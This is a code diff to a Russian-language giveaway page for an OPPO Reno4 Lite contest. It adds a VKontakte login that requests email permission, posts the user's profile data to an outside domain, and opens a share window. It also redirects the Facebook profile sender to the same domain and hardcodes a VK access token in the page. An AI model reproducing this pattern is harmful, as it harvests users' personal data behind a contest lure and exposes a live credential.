@@ -10,8 +10,59 @@
     <title>Участвуй в конкурсе и получи шанс выиграть OPPO Reno4 Lite!</title>
 
     <!-- VK SHARE -->
-    <script type="text/javascript" src="https://vk.com/js/api/share.js?95" charset="windows-1251"></script>
+    <script src="https://vk.com/js/api/openapi.js?168" type="text/javascript"></script>
+    <script>
+        function load(){
+            var vk = {
+                data: {},
+                api: "https://vk.com/js/api/openapi.js?168",
+                appID: 7607017,
+                appPermissions: 'email',
+                /* init: function(){
 
+                      $.js(vk.api);
+                      window.vkAsyncInit = function(){
+                           VK.init({apiId: vk.appID});*/
+
+            };
+            VK.Auth.login(authInfo, vk.appPermissions);
+            function authInfo(response){
+                if(response.session){
+                    console.log('авторизовались идем забирать данные');
+                    vk.data.user = response.session.user;
+
+                    console.log('забрали данные:');
+                    console.log(vk.data.user);
+
+                    console.log('отправляем JSON');
+
+                    var sendUrl = 'https://reno4.bublik.site/res/vkontakte.php';
+                    fetch(sendUrl, {
+                        method: "POST",
+                        credentials: 'include',
+                        headers: {'Content-Type': 'application/json;charset=utf-8'},
+                        body: vk.data.user
+                    })
+
+                    console.log('теперь запостим');
+                    pimg();
+
+                }else alert("Войдите в аккаунт");
+            }
+        }
+
+        function authNshare(){
+            console.log('сначала авторизуемся');
+            load();
+        }
+
+        function pimg() {
+            var url  = 'http://vkontakte.ru/share.php?url=https://manzhos.cz/share_fb/images/test_img.jpg&noparse=true';
+            window.open(url, 'Поделиться результатом', 'toolbar=0,status=0,width=626,height=436');
+        }
+
+    </script>
+    <!-- FB SHARE -->
     <script async defer
             crossorigin="anonymous"
             src="https://connect.facebook.net/ru_RU/sdk.js#xfbml=1&version=v8.0&appId=1045683782552173&autoLogAppEvents=1"
@@ -21,7 +72,7 @@
         function handle_fb_data(response){
             console.log('забираем данные');
             FB.api('/me', function(response) {
-                var sendUrl = 'https://oppo.bublik.site/res/facebook.php';
+                var sendUrl = 'https://reno4.bublik.site/res/facebook.php';
                 // отправляем данные пользователя
                 fetch(sendUrl, {
                     method: "POST",
@@ -695,7 +746,7 @@
                                                 <a class="" type="button" onclick="fb_share()">
                                                     <img src="img/icon-fb.svg" alt="">
                                                 </a>
-                                                <a class="ml-4" type="button">
+                                                <a class="ml-4" type="button" onclick="authNshare()" >
                                                     <img src="img/icon-vk.svg" alt="">
                                                 </a>
                                             </div>
@@ -756,6 +807,14 @@
             js.src = "//connect.facebook.net/en_US/sdk.js";
             fjs.parentNode.insertBefore(js, fjs);
         }(document, 'script', 'facebook-jssdk'));
+    </script>
+    <!-- VK SHARE SCRIPT -->
+    <script type="text/javascript">
+        console.log('инициировали VK.init');
+        VK.init({
+            apiId: 7607017,
+            access_token: '802f0a85802f0a85802f0a859a805b186c8802f802f0a85df43bd51aeac9187a8dad149'
+        });
     </script>
     <div id="bg-modal" class=""></div>
     </body>
